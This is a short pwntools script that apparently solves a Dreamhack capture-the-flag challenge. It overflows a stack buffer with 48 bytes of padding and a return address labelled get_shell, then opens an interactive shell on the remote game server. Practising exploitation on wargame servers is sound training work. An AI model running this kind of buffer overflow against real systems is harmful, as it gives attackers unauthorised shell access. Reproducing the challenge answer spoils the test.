from pwn import *

p = remote('host1.dreamhack.games', 14768)

get_shell = p32(0x0804867b)

p.sendline("A" * 48 + get_shell)


p.interactive()
